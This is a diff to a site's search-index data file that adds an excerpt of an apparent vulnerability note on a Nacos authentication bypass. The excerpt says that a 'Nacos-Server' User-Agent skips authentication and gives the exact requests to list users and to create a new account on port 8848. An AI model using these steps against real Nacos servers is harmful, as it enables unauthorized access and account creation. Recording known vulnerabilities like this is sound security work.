@@ -160,4 +160,10 @@ var store = [{
         "tags": ["ueditor","nday"],
         "url": "/vul/ueditor/",
         "teaser": null
+      },{
+        "title": "Nacos身份认证绕过漏洞",
+        "excerpt":"Nacos身份认证绕过漏洞  0x00 漏洞概述  Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。User-Agent为Nacos-Server时可绕过认证，添加新用户。   0x01 POC  添加User-Agent: Nacos-Server后访问http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9可以看到返回值为200,且内容中是否包含pageItems      0x02 漏洞利用  添加User-Agent: Nacos-Server后使用POST方法请求                         http://target:8848/nacos/v1/auth/users?username=yyj&amp;password=yyj 添加一个新用户      用创建的用户名和密码成功登录后台     ","categories": ["vul"],
+        "tags": ["nacos","nday"],
+        "url": "/vul/nacos/",
+        "teaser": null
       }]
